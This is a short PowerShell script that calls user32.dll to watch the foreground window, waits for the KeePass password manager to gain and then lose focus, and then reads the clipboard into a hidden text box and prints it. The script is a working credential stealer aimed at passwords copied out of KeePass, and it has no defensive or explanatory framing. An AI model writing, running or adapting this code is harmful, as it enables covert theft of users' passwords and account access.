# Import user32.dll
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class AllWindows {
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        }
"@
# Prepare TextBox
$Box = New-Object Windows.Forms.TextBox
$Box.Multiline=$false
## Loop
while(1){
    # Wait for Keepass to foreground
    while((Get-Process | Where {$_.MainWindowHandle -eq [AllWindows]::GetForegroundWindow()}).Processname -ne 'Keepass'){Sleep 1}
    # Wait for Keepass not in foreground
    while((Get-Process | Where {$_.MainWindowHandle -eq [AllWindows]::GetForegroundWindow()}).Processname -eq 'Keepass'){Sleep 1}
    # Clipboard to Box
    $Box.Paste()
    # Box Content / Clear Box
    if($Box.text){$Box.Text;$Box.ResetText()}
    ## Loop
    }
